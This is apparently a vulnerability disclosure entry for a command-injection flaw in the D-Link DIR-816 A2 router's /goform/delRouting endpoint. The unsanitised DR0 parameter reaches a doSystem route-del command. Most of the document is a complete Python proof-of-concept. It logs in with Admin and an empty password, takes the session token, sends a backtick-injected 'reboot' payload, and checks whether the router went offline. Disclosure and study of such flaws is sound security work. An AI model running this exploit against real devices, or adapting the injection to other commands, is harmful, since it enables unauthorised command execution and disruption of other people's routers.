## DIR 816

> bin_vision:DIR-816A2_v1.10CNB03_D77137
> goahead
> goform/delRouting
>
> type: command injection
> string: DR0

### description

The `delRouting` handler receives the user-controlled `DR0` parameter from the GoAhead web request. The value is parsed and the extracted fields are interpolated into a `route del` command string. The command is passed to `doSystem()` for shell execution without any sanitization of the input.

Vulnerability chain: `websGetVar("DR0")` -> parse fields -> `doSystem("route del -net %s netmask %s dev %s")`.

An authenticated attacker can inject shell metacharacters (e.g. backticks) in the `DR0` field to achieve command execution when the route deletion is processed.

### code

#### formDelRouting handler

~~~c
  websFormDefine("delRouting", (int)formDelRouting_handler);
~~~

~~~c
// formDelRouting handler
void formDelRouting(int wp)
{
    char *dr0 = websGetVar(wp, "DR0", "");        // <--- Read user-controlled DR0 from the request

    // Parses DR0 value and constructs route command
    // No sanitization before doSystem call
    doSystem("route del -net %s netmask %s dev %s", network, netmask, dev);  // <--- Execute command with tainted value
}
~~~

### PoC

Source: `PoC/CNB03_v1.10/verified/poc_delRouting.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in Delete Routing (delRouting)
Firmware: DIR-816A2_v1.10CNB03_D77137
Entry: 000271
Endpoint: /goform/delRouting
Parameter: DR0
Sink: doSystem("route del ... netmask %s dev %s") - DIRECT
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in Delete Routing (delRouting)")
    print(f"[*] Endpoint: /goform/delRouting")
    print(f"[*] Parameter: DR0")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "`reboot` 255.255.255.0 eth2.2"
    data = {"tokenid": tokenid, "DR0": payload}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/delRouting", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
